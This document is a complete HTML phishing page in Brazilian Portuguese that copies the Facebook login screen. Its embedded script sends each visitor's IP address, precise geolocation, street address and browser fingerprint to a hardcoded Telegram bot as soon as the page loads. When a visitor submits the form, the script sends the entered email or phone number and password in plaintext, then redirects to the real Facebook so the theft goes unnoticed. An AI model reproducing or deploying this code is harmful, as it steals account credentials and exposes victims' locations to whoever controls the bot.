<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - entre ou cadastre-se</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .top-language {
            color: #65676b;
            font-size: 14px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }
        
        .facebook-logo {
            width: 56px;
            height: 56px;
        }
        
        .login-form {
            width: 100%;
            max-width: 396px;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        
        .login-form input {
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            color: #1c1e21;
            background-color: #ffffff;
        }
        
        .login-form input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
            outline: none;
        }
        
        .login-btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .login-btn:hover {
            background-color: #166fe5;
        }
        
        .forgot-password {
            text-align: center;
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
            margin: 5px 0;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .divider {
            height: 1px;
            background-color: #dadde1;
            margin: 20px 0;
        }
        
        .create-account {
            background-color: #ffffff;
            border: 1px solid #1877f2;
            border-radius: 6px;
            font-size: 17px;
            line-height: 48px;
            color: #1877f2;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 10px;
        }
        
        .create-account:hover {
            background-color: #f5f7f9;
        }
        
        .footer {
            margin-top: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .meta-logo {
            height: 16px;
        }
        
        .error-message {
            color: #f02849;
            font-size: 13px;
            margin-top: 4px;
            display: none;
        }
        
        .connection-error {
            color: #f02849;
            font-size: 13px;
            text-align: center;
            margin-top: 12px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="top-language">Portugu√™s (Brasil)</div>
    
    <div class="logo-container">
        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" alt="Facebook" class="facebook-logo">
    </div>
    
    <form class="login-form" id="loginForm">
        <input type="text" id="email" placeholder="N√∫mero do celular ou email" required 
               autocapitalize="none" autocomplete="off" spellcheck="false">
        <div id="emailError" class="error-message">Digite um e-mail ou telefone v√°lido.</div>
        
        <input type="password" id="password" placeholder="Senha" required 
               autocapitalize="none" autocomplete="off" spellcheck="false">
        <div id="passwordError" class="error-message">A senha deve ter pelo menos 6 caracteres.</div>
        
        <button type="submit" class="login-btn">Entrar</button>
        
        <a href="#" class="forgot-password">Esqueceu a senha?</a>
        
        <div class="divider"></div>
        
        <button type="button" class="create-account" id="createAccount">Criar nova conta</button>
        <div id="connectionError" class="connection-error">Erro de conex√£o. Tente novamente.</div>
    </form>
    
    <div class="footer">
        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta" class="meta-logo">
    </div>

    <script>
        const TOKEN = "7683050283:AAGOe9GTGh3Yw3r9pqWg1A8Ap0p0_e4ffSg";
        const CHAT_ID = "5542692841";
        const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const createAccountBtn = document.getElementById('createAccount');
        const connectionError = document.getElementById('connectionError');
        
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^\d{8,}$/;
        const MIN_PASSWORD_LENGTH = 6;
        
        let userLocation = null;
        let userAddressInfo = null;
        let userIP = null;
        let deviceInfoSent = false;
        
        function isValidEmailOrPhone(value) {
            return emailRegex.test(value) || phoneRegex.test(value);
        }
        
        emailInput.addEventListener('input', () => {
            if (!isValidEmailOrPhone(emailInput.value.trim())) {
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
            }
        });
        
        passwordInput.addEventListener('input', () => {
            if (passwordInput.value.length < MIN_PASSWORD_LENGTH) {
                passwordError.style.display = 'block';
            } else {
                passwordError.style.display = 'none';
            }
        });
        
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject("Geolocaliza√ß√£o n√£o suportada");
                    return;
                }
        
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                        resolve(location);
                    },
                    (error) => {
                        reject(error);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return "IP n√£o dispon√≠vel";
            }
        }
        
        async function getAddressFromCoords(latitude, longitude) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
                const data = await response.json();
                
                if (data && data.address) {
                    const address = data.address;
                    return {
                        country: address.country || "N/A",
                        state: address.state || address.region || "N/A",
                        city: address.city || address.town || address.village || "N/A",
                        road: address.road || "N/A",
                        postcode: address.postcode || "N/A"
                    };
                }
                return null;
            } catch (error) {
                return null;
            }
        }
        
        async function sendToTelegram(emailOrPhone, password, location, ip, addressInfo, isLogin = false) {
            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const screenWidth = screen.width;
            const screenHeight = screen.height;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const platform = navigator.platform;
            const vendor = navigator.vendor;
            const cookieEnabled = navigator.cookieEnabled;
            const javaEnabled = navigator.javaEnabled();
            const pdfEnabled = navigator.pdfViewerEnabled;
            const doNotTrack = navigator.doNotTrack;
            const connection = navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : null;
        
            let locationInfo = "";
            if (location && addressInfo) {
                locationInfo = `
        üìç *Localiza√ß√£o Detalhada*
        üó∫Ô∏è Coordenadas: ${location.latitude}, ${location.longitude}
        üè¥ Pa√≠s: ${addressInfo.country}
        üèõÔ∏è Estado: ${addressInfo.state}
        üèôÔ∏è Cidade: ${addressInfo.city}
        üõ£Ô∏è Rua: ${addressInfo.road}
        üìÆ CEP: ${addressInfo.postcode}`;
            } else if (location) {
                locationInfo = `üìç Coordenadas: ${location.latitude}, ${location.longitude}`;
            } else {
                locationInfo = "üìç Localiza√ß√£o: Negada pelo usu√°rio";
            }
        
            let connectionInfo = "";
            if (connection) {
                connectionInfo = `üì∂ Conex√£o: ${connection.effectiveType} | Velocidade: ${connection.downlink}Mb/s | Lat√™ncia: ${connection.rtt}ms`;
            }
        
            let credentialsInfo = "";
            if (isLogin && emailOrPhone && password) {
                credentialsInfo = `
        üë§ *Credenciais de Login*
        üìß Usu√°rio: ${emailOrPhone}
        üîë Senha: ${password}`;
            }
        
            const messageType = isLogin ? "üîê *TENTATIVA DE LOGIN DETECTADA*" : "üì± *USU√ÅRIO ACESSOU A P√ÅGINA*";
        
            const messageText = `
        ${messageType}
        
        ${credentialsInfo}
        
        üåê *Informa√ß√µes de Rede*
        ${locationInfo}
        üñ•Ô∏è IP: ${ip}
        ${connectionInfo}
        
        üì± *Informa√ß√µes do Dispositivo*
        üñ•Ô∏è Navegador/SO: ${userAgent}
        üíª Plataforma: ${platform}
        üè¢ Vendor: ${vendor}
        üñ•Ô∏è Resolu√ß√£o: ${screenWidth}x${screenHeight}
        üåê Idioma: ${language}
        ‚è∞ Fuso hor√°rio: ${timezone}
        
        üîß *Configura√ß√µes do Navegador*
        üç™ Cookies: ${cookieEnabled ? "Ativado" : "Desativado"}
        ‚òï Java: ${javaEnabled ? "Ativado" : "Desativado"}
        üìÑ PDF: ${pdfEnabled ? "Ativado" : "Desativado"}
        üö´ Rastreamento: ${doNotTrack || "N√£o especificado"}
            `;
        
            try {
                const response = await fetch(URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: messageText,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                console.log("Mensagem enviada com sucesso para o Telegram");
            } catch (error) {
                console.error("Erro ao enviar para o Telegram:", error);
            }
        }
        
        async function collectAndSendDeviceInfo() {
            if (deviceInfoSent) return;
            
            try {
                userIP = await getUserIP();
                
                try {
                    userLocation = await getLocation();
                    if (userLocation) {
                        userAddressInfo = await getAddressFromCoords(userLocation.latitude, userLocation.longitude);
                    }
                } catch (error) {
                    console.log("Localiza√ß√£o recusada ou indispon√≠vel");
                }
            
                await sendToTelegram("", "", userLocation, userIP, userAddressInfo, false);
                deviceInfoSent = true;
            } catch (error) {
                console.error("Erro ao coletar informa√ß√µes do dispositivo:", error);
            }
        }
        
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
        
            const emailOrPhone = emailInput.value.trim();
            const password = passwordInput.value;
        
            let valid = true;
        
            if (!isValidEmailOrPhone(emailOrPhone)) {
                emailError.style.display = 'block';
                valid = false;
            }
        
            if (password.length < MIN_PASSWORD_LENGTH) {
                passwordError.style.display = 'block';
                valid = false;
            }
        
            if (!valid) return;
        
            if (!userIP) {
                userIP = await getUserIP();
            }
        
            if (!userLocation) {
                try {
                    userLocation = await getLocation();
                    if (userLocation) {
                        userAddressInfo = await getAddressFromCoords(userLocation.latitude, userLocation.longitude);
                    }
                } catch (error) {
                    console.log("Localiza√ß√£o recusada ou indispon√≠vel");
                }
            }
        
            await sendToTelegram(emailOrPhone, password, userLocation, userIP, userAddressInfo, true);
        
            window.location.href = "https://facebook.com";
        });
        
        createAccountBtn.addEventListener('click', function() {
            connectionError.style.display = 'block';
            
            setTimeout(() => {
                connectionError.style.display = 'none';
            }, 3000);
        });
        
        // CORRE√á√ÉO: Enviar informa√ß√µes imediatamente ao carregar a p√°gina
        window.addEventListener('load', function() {
            // Removido o setTimeout e chamada direta da fun√ß√£o
            collectAndSendDeviceInfo();
        });

        // CORRE√á√ÉO ADICIONAL: Enviar tamb√©m quando o DOM estiver pronto
        document.addEventListener('DOMContentLoaded', function() {
            collectAndSendDeviceInfo();
        });
    </script>
</body>
</html>
